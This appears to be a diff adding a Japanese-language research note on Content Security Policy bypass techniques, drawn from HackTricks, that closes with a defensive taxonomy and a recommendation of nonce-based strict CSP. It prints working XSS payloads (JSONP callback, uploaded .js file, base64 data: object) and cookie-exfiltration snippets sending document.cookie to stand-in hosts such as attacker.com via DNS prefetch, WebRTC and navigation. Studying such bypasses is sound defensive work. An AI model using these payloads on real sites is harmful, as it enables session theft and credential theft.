+
+`ajax.googleapis.com` が許可されていれば、AngularJSを読み込んでガジェット化する定番も使える。
+
+```html
+<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
+```
+
+#### ファイルアップロード + `'self'`
+
+`script-src 'self'` のサイトに、JSとして解釈されるファイルをアップロードできれば自爆する。
+
+```html
+"/>'><script src="/uploads/picture.png.js"></script>
+```
+
+拡張子偽装（`.png.js`）やポリグロット、サーバのMIME判定次第で成立する。**同一オリジンにアップロード機能があるなら `'self'` は危険**という教訓。
+
+#### ディレクティブ欠落の悪用
+
+`object-src` も `default-src` も無ければ、`<object>` で `data:` HTMLを実行できる。
+
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
+`base-uri` 欠落は前述の `<base>` 乗っ取りにつながる。
+
+#### ポリシー・インジェクション
+
+アプリがCSP文字列に攻撃者入力を反映してしまう場合、ポリシー自体を書き換える。
+- **Chrome**：`script-src-elem *` を注入して制限を上書き（後発ディレクティブが優先される挙動を悪用）。
+- **Edge**：`;_` を注入してポリシー全体を壊す（無効化）。
+
+#### 外部通信ゼロでの情報持ち出し
+
+`connect-src` すら無い環境でのデータ漏洩の実物。
+
+```javascript
+// DNSプリフェッチにcookieを載せる
+var sessionid = document.cookie.split("=")[1];
+var body = document.getElementsByTagName("body")[0];
+body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.ch">'
+```
+
+```javascript
+// WebRTCのDNS問い合わせで漏らす
+p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] });
+p.createDataChannel("");
+p.setLocalDescription(await p.createOffer())
+```
+
+```javascript
+// 素朴なナビゲーション
+document.location = "https://attacker.com/?" + document.cookie
+```
+
+#### PHP実装依存のバイパス
+
+CSPヘッダを `header()` で送る前に出力が始まってしまうとヘッダが付かない、という実装の隙を突く。
+- **max_input_vars 超過**：大量のPOST変数を送るとwarningが `header()` 前に出力され、「headers already sent」でCSPヘッダの送出に失敗する。
+- **レスポンスバッファ飽和**：4096バイト超のwarning等でバッファを溢れさせ、CSP付与前に本文送信を始めさせる。
+
+#### `form-action` 欠落による資格情報窃取
+
+`form-action` が無いと、反映HTMLに偽ログインフォームを注入できる。ブラウザのパスワードマネージャが自動入力し、既定の `GET` 送信で資格情報がURLに載り、`<meta http-equiv="Refresh">` でクロスオリジンへ飛ばしてReferer経由で漏らす。joaxcarの事例で `form-action` 欠落が別途指摘されたのはこの文脈である。
+
+#### ブックマークレット
+
+CSPは「ページ内で読み込むリソース」を制御するが、ユーザがドラッグ＆ドロップした**ブックマークレット**はページのCSPの外で実行される。ソーシャルエンジニアリングと組み合わせる古典。
+
+#### 分析ツール
+
+- **CSP Evaluator**（Google）: https://csp-evaluator.withgoogle.com/ — ポリシーの弱点を機械診断
+- **CSP Validator**: https://cspvalidator.org/
+- **csper.io** — 観測リソースから候補ポリシーを生成
+
+> 出典: HackTricks — Content Security Policy (CSP) Bypass — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
+
+---
+
+### 横断まとめ：バイパスを4つの型に分類する
+
+3資料を貫く共通構造を、防御設計に使える形で分類しておく。
+
+1. **許可リストの過剰（設定漏れ型）**：CDNまるごと・`*`・`data:`・`unsafe-inline`/`unsafe-eval`。→ パスまで厳密指定、`'strict-dynamic'` + nonce に移行し、ホスト名ホワイトリストへの依存を捨てる。
+2. **信頼済みドメイン内のガジェット（ホワイトリスト裏切り型）**：JSONP、AngularJS、既存ライブラリのテンプレート評価。→ 許可ドメインをCSP Evaluator / JSONBee で監査。Google系（`www.google.com`, `ajax.googleapis.com`, `accounts.google.com`）は特に危険。
+3. **パーサ・仕様の解釈差（デコード/リダイレクト型）**：`%2f` のRPO、リダイレクトでのパス無視、`<base>` 乗っ取り、ポリシー・インジェクション。→ `base-uri 'none'`、オープンリダイレクト排除、`%2f` を正規化しない、CSP文字列に入力を反映しない。
+4. **実行は防いでも漏洩は防げない（範囲外型）**：`location`、WebRTC、DNSプリフェッチ、`form-action` 欠落による資格情報窃取。→ `connect-src`/`form-action`/`navigate-to` を明示し、CSPを「XSS実行の防止」に限定した防御と割り切って多層で守る。
+
+最重要の実務結論は、`strict-dynamic` を伴うnonceベースCSP（strict CSP、s4i参照）への移行である。ホスト名ホワイトリスト方式は上記1〜3のほぼ全てに晒されるが、strict CSPはホワイトリスト自体を無効化するため、JSONP・AngularJS・RPO・リダイレクトといった「信頼済みドメイン悪用」系のバイパスをまとめて封じられる。joaxcarのportswigger.net事例は、まさに `strict-dynamic` の欠落が全ての引き金だったことを示している。
 
 ---
 
